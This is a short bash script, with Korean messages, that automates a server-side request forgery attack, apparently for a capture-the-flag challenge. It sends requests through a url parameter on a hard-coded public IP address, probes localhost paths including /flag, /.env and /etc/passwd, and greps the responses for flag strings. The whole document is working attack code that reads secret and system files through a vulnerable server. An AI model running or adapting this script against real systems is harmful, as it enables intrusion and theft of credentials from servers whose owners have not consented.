#!/bin/bash

TARGET="http://16.171.15.52/home.php"
HOSTS=("127.0.0.1" "localhost" "127.0.0.1:80")
PATHS=("/flag" "/admin/flag" "/flag.txt" "/.env" "/etc/passwd" "/view_post.php?id=FLAGGG")

echo "[*] SSRF 플래그 자동화 시작합니다..."

for host in "${HOSTS[@]}"; do
  for path in "${PATHS[@]}"; do
    URL="http://${host}${path}"
    echo "[*] 요청 중: $URL"

    # SSRF 요청 전송
    RESP=$(curl -s "$TARGET?url=$URL")

    # 응답에서 flag 패턴 추출
    if echo "$RESP" | grep -Eo "flag\{[^\}]*\}|FLAG\{[^\}]*\}" > /dev/null; then
      echo "[+] 🎉 플래그 발견!"
      echo "$RESP" | grep -Eo "flag\{[^\}]*\}|FLAG\{[^\}]*\}"
      exit 0
    fi
  done
done

echo "[-] 아쉽게도 flag{...} 는 찾지 못했습니다."
